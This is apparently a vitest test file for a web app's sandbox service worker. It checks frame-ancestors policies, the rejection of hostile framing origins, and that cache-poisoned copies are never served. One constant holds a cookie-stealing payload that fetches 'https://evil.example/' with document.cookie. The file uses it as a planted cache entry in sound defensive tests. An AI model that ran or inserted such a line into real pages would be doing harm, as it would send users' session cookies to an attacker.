import { describe, expect, it } from "vitest";
import { ASSETS, HOST, ORIGIN, SandboxWorker } from "./worker-harness";

const LESSON = "/views/assets/lesson-a.js";
const PRACTICE = "/views/assets/practice-a.js";
const FONT = "/views/assets/inter-a.woff2";
const BUILD = { [LESSON]: "lesson", [PRACTICE]: "practice", [FONT]: "font" };
const PLANTED = "fetch('https://evil.example/' + document.cookie)";
const FULL = new DOMException(
  "The quota has been exceeded.",
  "QuotaExceededError",
);

const at = (path: string) => `${ORIGIN}${path}`;
const framed = (path: string, host = HOST) =>
  at(`${path}?host=${encodeURIComponent(host)}`);
const fetchesOf = (worker: SandboxWorker, path: string) =>
  worker.fetched.filter((address) => address === at(path)).length;

describe("the sandbox's pages", () => {
  it.each([
    ["/ui-sandbox", "proxy page", `frame-ancestors ${HOST}`],
    ["/ui-sandbox-frame", "frame page", `frame-ancestors 'self' ${HOST}`],
  ])(
    "builds %s itself, with no connection and nothing cached",
    async (path, body, policy) => {
      const worker = new SandboxWorker(BUILD);
      worker.online = false;

      const response = await worker.request(framed(path));

      expect(await response?.text()).toBe(body);
      expect(response?.headers.get("content-security-policy")).toBe(policy);
      expect(response?.headers.get("content-type")).toBe(
        "text/html; charset=utf-8",
      );
    },
  );

  it.each(["/ui-sandbox", "/ui-sandbox-frame"])(
    "never answers %s with a copy a view planted in a cache",
    async (path) => {
      const worker = new SandboxWorker(BUILD);
      for (const name of [ASSETS, "graspy-sandbox-pages-v1"])
        await worker.plant(name, framed(path), PLANTED);

      const response = await worker.request(framed(path));

      expect(await response?.text()).not.toBe(PLANTED);
      expect(response?.headers.get("content-security-policy")).toContain(HOST);
      expect(worker.fetched).toEqual([]);
    },
  );

  it.each([HOST, "https://a1b2c3d4.graspy.pages.dev"])(
    "lets %s frame the sandbox",
    async (host) => {
      const worker = new SandboxWorker(BUILD);

      const response = await worker.request(framed("/ui-sandbox", host));

      expect(response?.status).toBe(200);
    },
  );

  it.each([
    "https://evil.example",
    ORIGIN,
    "https://a.b.graspy.pages.dev",
    "https://.graspy.pages.dev",
    `${HOST}/`,
    `${HOST} https://evil.example`,
    "https://evil.example?https://graspy.test",
    "",
  ])("lets no page be framed by %j", async (host) => {
    const worker = new SandboxWorker(BUILD);

    for (const path of ["/ui-sandbox", "/ui-sandbox-frame"]) {
      const response = await worker.request(framed(path, host));
      expect(response?.status).toBe(400);
      expect(response?.headers.get("content-security-policy")).toBeNull();
    }
  });
});

describe("the view's files", () => {
  it("caches every view's files once a sandbox asks", async () => {
    const worker = new SandboxWorker(BUILD);

    await worker.precache();

    expect(worker.assets().sort()).toEqual(Object.keys(BUILD).sort());
  });

  it("opens a view never shown when there is no connection", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.precache();
    worker.online = false;

    const response = await worker.request(at(PRACTICE));

    expect(await response?.text()).toBe("practice");
  });

  it("serves the network's file, and keeps it, in place of a planted copy", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.precache();
    await worker.plant(ASSETS, PRACTICE, PLANTED);

    const response = await worker.request(at(PRACTICE));

    expect(await response?.text()).toBe("practice");
    expect(await (await worker.cache(ASSETS).match(PRACTICE))?.text()).toBe(
      "practice",
    );
  });

  it("fails without a connection rather than serve a planted copy", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.plant(ASSETS, PRACTICE, PLANTED);
    worker.online = false;

    await expect(worker.request(at(PRACTICE))).rejects.toThrow();
    expect(worker.assets()).not.toContain(PRACTICE);
  });

  it("leaves a file not in its build to the network, planted or not", async () => {
    const worker = new SandboxWorker(BUILD);
    const past = "/views/assets/lesson-old.js";
    await worker.plant(ASSETS, past, PLANTED);

    expect(await worker.request(at(past))).toBeUndefined();
  });

  it("keeps no file the network gave with another digest", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.serve(LESSON, "lesson of another build");

    const response = await worker.request(at(LESSON));
    await worker.precache();

    expect(await response?.text()).toBe("lesson of another build");
    expect(worker.assets()).not.toContain(LESSON);
  });

  it("drops whatever else its cache holds", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.plant(ASSETS, "/views/assets/lesson-old.js", "old");
    await worker.plant(ASSETS, "/ui-sandbox-frame?host=x", PLANTED);

    await worker.precache();

    expect(worker.assets().sort()).toEqual(Object.keys(BUILD).sort());
  });

  it("drops every other cache as it takes over", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.plant("graspy-sandbox-pages-v1", "/ui-sandbox", PLANTED);
    await worker.plant("graspy-view-assets-v1", LESSON, PLANTED);
    await worker.precache();

    await worker.activate();

    expect([...worker.caches.keys()]).toEqual([ASSETS]);
  });

  it("fetches only the files it lacks, once however many sandboxes ask", async () => {
    const worker = new SandboxWorker(BUILD);

    await Promise.all([worker.precache(), worker.precache()]);
    await worker.precache();

    for (const path of Object.keys(BUILD))
      expect(fetchesOf(worker, path)).toBe(1);
  });

  it("keeps going past a file that fails, and fetches it on the next pass", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.network.delete(at(FONT));

    await worker.precache();
    expect(worker.assets()).not.toContain(FONT);

    worker.serve(FONT, "font");
    await worker.precache();
    expect(worker.assets()).toContain(FONT);
  });

  it("answers from the network though storing the file fails", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.cache(ASSETS).refusal = FULL;

    const response = await worker.request(at(LESSON));

    expect(await response?.text()).toBe("lesson");
  });
});
